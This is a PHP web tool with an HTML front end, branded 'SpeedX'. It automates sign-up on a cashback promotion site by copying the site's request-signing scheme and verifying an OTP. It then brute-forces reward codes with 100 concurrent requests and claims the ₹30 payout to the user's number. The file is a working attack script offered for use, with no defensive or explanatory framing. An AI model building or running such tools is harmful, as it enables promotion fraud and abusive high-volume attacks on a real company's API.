<?php
session_start();
set_time_limit(0);
ini_set('max_execution_time', 0);
ini_set('memory_limit', '-1');

ob_implicit_flush(true);
while (ob_get_level()) ob_end_clean();

$BASE_URL = "https://slayyourplaypromo.in";
$USER_AGENT = "Mozilla/5.0 (Linux; Android 15; Pixel 9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Mobile Safari/537.36";

function generateMasterKey() { return (string)rand(100000000, 999999999); }
function getTimestamp() { return round(microtime(true) * 1000); }

function generateSignatureData($payload, $userKey, $dataKey) {
    $payloadStr = str_replace(['": ', '", '], ['":', '",'], json_encode($payload));
    $a = base64_encode($payloadStr);
    $ts = (string)$payload['t'];
    $u = base64_encode($ts);
    $hmacKey = substr($dataKey, 4, 14);
    $message = "$u.$a";
    $hexSig = hash_hmac('sha256', $message, $hmacKey);
    $f = base64_encode($hexSig);
    $m = mt_rand(1, 6); $k = mt_rand(2, 8);
    $alphabet = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    $hRand = substr(str_shuffle($alphabet), 0, $k);
    $g = $k . $m . substr($f, 0, $m) . $hRand . substr($f, $m);
    return "userKey=" . urlencode($userKey) . "&data=" . urlencode($u) . "." . urlencode($a) . "." . urlencode($g);
}

function decryptResponse($encryptedResp) {
    try { return json_decode(base64_decode($encryptedResp), true); } catch (Exception $e) { return []; }
}

function apiRequest($method, $path, $body, $headers = []) {
    global $BASE_URL, $USER_AGENT;
    $ch = curl_init("$BASE_URL$path");
    $defaultHeaders = ["accept: */*", "accept-language: en-US,en;q=0.9", "origin: $BASE_URL", "user-agent: $USER_AGENT"];
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, array_merge($defaultHeaders, $headers));
    if ($method === 'POST') { curl_setopt($ch, CURLOPT_POST, true); curl_setopt($ch, CURLOPT_POSTFIELDS, $body); }
    $response = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    return [$httpCode, $response];
}

function apiFormPost($path, $payload, $userKey, $dataKey, $referer = "/", $accessToken = null) {
    global $BASE_URL;
    $ts = getTimestamp();
    $payload['t'] = $ts; $payload['userKey'] = $userKey;
    $body = generateSignatureData($payload, $userKey, $dataKey);
    $headers = ["content-type: application/x-www-form-urlencoded; charset=UTF-8", "referer: $BASE_URL$referer"];
    if ($accessToken) $headers[] = "authorization: Bearer $accessToken";
    list($status, $resp) = apiRequest('POST', "$path/$userKey?t=$ts", $body, $headers);
    $respJson = json_decode($resp, true);
    if (isset($respJson['resp'])) {
        $result = decryptResponse($respJson['resp']);
        $result['statusCode'] = $status;
        return $result;
    }
    return $respJson ? array_merge($respJson, ['statusCode' => $status]) : ['statusCode' => $status];
}

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action'])) {
    header('Content-Type: application/json');
    $action = $_POST['action'];
    
    if ($action === 'send_otp') {
        $mobile = $_POST['mobile'];
        $masterKey = generateMasterKey();
        $ipInfo = ["city" => "New Delhi", "country" => "India", "countryCode" => "IN", "status" => "success"];
        list($status, $resp) = apiRequest('POST', '/api/users', json_encode(["masterKey" => $masterKey, "ipInfo" => $ipInfo]), ["content-type: application/json"]);
        $data = json_decode($resp, true);
        if (isset($data['resp'])) {
            $decrypted = decryptResponse($data['resp']);
            if (isset($decrypted['userKey']) && isset($decrypted['dataKey'])) {
                apiFormPost("/api/users/clickTrack", ["smoker" => "yes"], $decrypted['userKey'], $decrypted['dataKey']);
                $otpResult = apiFormPost("/api/users/register", ["mobile" => $mobile, "limit" => ""], $decrypted['userKey'], $decrypted['dataKey'], "/register");
                if ($otpResult['statusCode'] == 200) {
                    echo json_encode(["status" => "success", "userKey" => $decrypted['userKey'], "dataKey" => $decrypted['dataKey']]);
                    exit;
                }
            }
        }
        echo json_encode(["status" => "error", "message" => "Failed to initiate API"]);
        exit;
    }
    
    if ($action === 'verify_otp') {
        $verifyResult = apiFormPost("/api/users/verifyOTP", ["otp" => $_POST['otp']], $_POST['userKey'], $_POST['dataKey'], "/register");
        if (isset($verifyResult['accessToken'])) {
            apiFormPost("/api/users/selectPack", ["pack" => "full"], $_POST['userKey'], $_POST['dataKey'], "/choose-reward", $verifyResult['accessToken']);
            apiFormPost("/api/users/selectVibe", ["vibe" => "soft savage"], $_POST['userKey'], $_POST['dataKey'], "/ai-rap-home", $verifyResult['accessToken']);
            echo json_encode(["status" => "success", "accessToken" => $verifyResult['accessToken']]);
            exit;
        }
        echo json_encode(["status" => "error", "message" => "Invalid OTP"]);
        exit;
    }
    exit;
}

if (isset($_GET['stream']) && isset($_GET['userKey'])) {
    header('Content-Type: text/event-stream');
    header('Cache-Control: no-cache');
    header('Connection: keep-alive');
    
    $uK = $_GET['userKey']; $dK = $_GET['dataKey']; $aT = $_GET['accessToken']; $mob = $_GET['mobile'];
    
    // ULTIMATE FIRE SPEED 🔥
    $concurrency = 100; // 100 parallel requests
    $uiThrottleCount = 0; 
    
    $mh = curl_multi_init();
    $handles = [];

    $addRequest = function() use ($mh, $uK, $dK, $aT, &$handles, $BASE_URL, $USER_AGENT) {
        $code = str_pad(mt_rand(0, 999999) . mt_rand(0, 999999), 12, '0', STR_PAD_LEFT);
        $ts = getTimestamp();
        $body = generateSignatureData(["code" => $code, "t" => $ts, "userKey" => $uK], $uK, $dK);
        
        $ch = curl_init("$BASE_URL/api/users/getCode/$uK?t=$ts");
        curl_setopt_array($ch, [
            CURLOPT_RETURNTRANSFER => true, 
            CURLOPT_POST => true, 
            CURLOPT_POSTFIELDS => $body,
            CURLOPT_TIMEOUT => 10,           
            CURLOPT_CONNECTTIMEOUT => 3,     
            CURLOPT_ENCODING => '',          
            CURLOPT_TCP_NODELAY => true,     // Fire packets instantly
            CURLOPT_TCP_KEEPALIVE => 1,      // Reuse connection
            CURLOPT_DNS_CACHE_TIMEOUT => 3600, // Stop DNS lookups
            CURLOPT_HTTPHEADER => ["accept: application/json", "content-type: application/x-www-form-urlencoded; charset=UTF-8", "authorization: Bearer $aT", "user-agent: $USER_AGENT"]
        ]);
        curl_multi_add_handle($mh, $ch);
        $handles[(int)$ch] = $code;
    };

    for ($i = 0; $i < $concurrency; $i++) $addRequest();

    $active = null;
    do { $mrc = curl_multi_exec($mh, $active); } while ($mrc == CURLM_CALL_MULTI_PERFORM);

    while ($active && $mrc == CURLM_OK) {
        if (curl_multi_select($mh) === -1) usleep(10); // Micro sleep
        do { $mrc = curl_multi_exec($mh, $active); } while ($mrc == CURLM_CALL_MULTI_PERFORM);
        
        while ($info = curl_multi_info_read($mh)) {
            $ch = $info['handle'];
            $code = $handles[(int)$ch];
            $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
            
            if ($httpCode == 200) {
                apiFormPost("/api/users/getUpiNo", ["upiNo" => $mob], $uK, $dK, "/cashback", $aT);
                echo "data: " . json_encode(["status" => "valid", "code" => $code]) . "\n\n";
                @flush(); curl_multi_close($mh); exit;
            } else {
                $uiThrottleCount++;
                // 50x Throttling: UI update only after 50 tests to save max server CPU 🔥
                if ($uiThrottleCount % 50 === 0) {
                    echo "data: " . json_encode(["status" => "invalid", "code" => $code]) . "\n\n";
                    @flush();
                }
            }
            
            curl_multi_remove_handle($mh, $ch);
            curl_close($ch);
            unset($handles[(int)$ch]);
            
            $addRequest(); // Instantly replace
            
            do { $mrc = curl_multi_exec($mh, $active); } while ($mrc == CURLM_CALL_MULTI_PERFORM);
        }
    }
    exit;
}
?>
<!doctype html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    <title>SpeedX</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
    <style>
        *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
        :root { --bg: #f7f7f8; --white: #ffffff; --border: #e5e5ea; --ink: #111118; --ink2: #6c6c80; --ink3: #b0b0c0; --blue: #2563eb; --blue-bg: #eff3ff; --green: #15803d; --green-bg: #f0fdf4; --green-border: #bbf7d0; --red: #b91c1c; --red-bg: #fef2f2; --red-border: #fecaca; --f: 'Inter', sans-serif; --r: 12px; }
        body { background: var(--bg); color: var(--ink); font-family: var(--f); min-height: 100vh; padding-bottom: 60px; font-size: 14px; line-height: 1.5; -webkit-font-smoothing: antialiased; }
        .wrap { max-width: 420px; margin: 0 auto; padding: 0 16px; }
        .hdr { display: flex; align-items: center; justify-content: center; padding: 20px 0 18px; border-bottom: 1px solid var(--border); margin-bottom: 24px; }
        .logo { font-size: 20px; font-weight: 700; letter-spacing: -.3px; }
        .logo span { color: var(--blue); }
        .fcard { background: var(--white); border: 1px solid var(--border); border-radius: var(--r); padding: 20px 16px; margin-bottom: 12px; }
        .fd { margin-bottom: 15px; }
        .fd label { display: block; font-size: 12px; font-weight: 600; color: var(--ink2); margin-bottom: 6px; }
        .inp { width: 100%; background: var(--bg); border: 1px solid var(--border); color: var(--ink); border-radius: 8px; padding: 12px; font-size: 14px; outline: none; }
        .btn-row { display: flex; gap: 10px; margin-top: 18px; }
        .btn { padding: 12px 14px; border-radius: 8px; font-size: 14px; font-weight: 600; cursor: pointer; border: none; width: 100%; display: inline-flex; align-items: center; justify-content: center;}
        .btn-main { background: var(--blue); color: #fff; }
        .spin { width: 14px; height: 14px; border: 2px solid rgba(255, 255, 255, .3); border-top-color: #fff; border-radius: 50%; animation: rot .5s linear infinite; display: none; }
        @keyframes rot { to { transform: rotate(360deg); } }
        .log-box { margin-top: 8px; font-family: monospace; font-size: 14px; text-align: center; background: #0c0c0e; color: #39ff14; padding: 25px 12px; border-radius: 8px; font-weight: 600; border: 1px solid var(--border); }
        .toast { position: fixed; bottom: 24px; left: 50%; transform: translateX(-50%); background: var(--ink); color: #fff; padding: 10px 20px; border-radius: 50px; font-size: 13px; opacity: 0; transition: all .22s ease; }
        .toast.show { opacity: 1; }
        .foot { text-align: center; font-size: 13px; color: var(--ink3); padding-top: 30px; }
    </style>
</head>
<body>
<div class="wrap">
    <div class="hdr"><div class="logo">₹30 Reward <span>Win</span></div></div>
    
    <div class="fcard" id="step1">
        <div class="fd"><label>Mobile Number</label><input type="text" class="inp" id="mobile" placeholder="10-digit number" maxlength="10"></div>
        <div class="btn-row"><button class="btn btn-main" id="btnSendOTP" onclick="sendOTP()"><div class="spin" id="spin1"></div> Send OTP</button></div>
    </div>

    <div class="fcard" id="step2" style="display:none;">
        <div class="fd"><label>Enter OTP</label><input type="text" class="inp" id="otp" placeholder="6-digit OTP"></div>
        <div class="btn-row"><button class="btn btn-main" id="btnVerify" onclick="verifyOTP()"><div class="spin" id="spin2"></div> Verify & Stream</button></div>
    </div>

    <div class="fcard" id="step3" style="display:none;">
        <h3 id="statusTitle" style="margin-bottom:15px; color:var(--ink); text-align: center;">Code Scanning in Progress...</h3>
        <div class="log-box" id="logBox">
            Code Finding Please Wait...<br><br>
            <span id="liveCode" style="color: yellow; font-size: 16px;">Initializing Ultra Fast Threads...</span>
        </div>
        <div id="warnNote" style="margin-top: 15px; font-size: 12px; color: var(--red); text-align: center; font-weight: 600; line-height: 1.4;">
            ⚠️ Note: Please Don't Close This Page & Don't Open Other App
        </div>
    </div>
    <div class="foot">Created By SpeedX</div>
</div>

<script>
    let uKey, dKey, aToken, mobNo, evtSource;
    
    async function req(action, data) {
        let fd = new FormData(); fd.append('action', action);
        for(let k in data) fd.append(k, data[k]);
        return await (await fetch('', {method: 'POST', body: fd})).json();
    }

    async function sendOTP() {
        mobNo = document.getElementById('mobile').value;
        if(mobNo.length !== 10) return alert("Invalid Mobile");
        document.getElementById('spin1').style.display = 'block';
        let res = await req('send_otp', {mobile: mobNo});
        if(res.status === 'success') {
            uKey = res.userKey; dKey = res.dataKey;
            document.getElementById('step1').style.display = 'none';
            document.getElementById('step2').style.display = 'block';
        } else alert("Failed: " + res.message);
        document.getElementById('spin1').style.display = 'none';
    }

    async function verifyOTP() {
        let otp = document.getElementById('otp').value;
        if(!otp) return alert("Enter OTP");
        document.getElementById('spin2').style.display = 'block';
        let res = await req('verify_otp', {otp: otp, userKey: uKey, dataKey: dKey});
        if(res.status === 'success') {
            aToken = res.accessToken;
            document.getElementById('step2').style.display = 'none';
            document.getElementById('step3').style.display = 'block';
            startTermuxStream();
        } else alert("Invalid OTP");
        document.getElementById('spin2').style.display = 'none';
    }

    function startTermuxStream() {
        evtSource = new EventSource(`?stream=1&userKey=${uKey}&dataKey=${dKey}&accessToken=${aToken}&mobile=${mobNo}`);
        
        evtSource.onmessage = function(event) {
            let data = JSON.parse(event.data);
            if(data.status === 'valid') {
                evtSource.close();
                
                document.getElementById('statusTitle').innerText = "Vaild Code Find Success!";
                document.getElementById('statusTitle').style.color = "var(--green)";
                document.getElementById('warnNote').style.display = "none";
                
                let logBox = document.getElementById('logBox');
                logBox.style.background = "var(--green-bg)";
                logBox.style.color = "var(--green)";
                logBox.style.borderColor = "var(--green-border)";
                logBox.innerHTML = `Reward Submit Success ₹30 Received Soon...<br><br><span style="font-size:12px;color:var(--ink2);font-weight:500;">Code: ${data.code}</span>`;
                
                setTimeout(() => {
                    window.location.href = "https://t.me/iSpeedX1";
                }, 3500);
            } else {
                document.getElementById('liveCode').innerText = "Testing: " + data.code;
            }
        };
    }
</script>
</body>
</html>
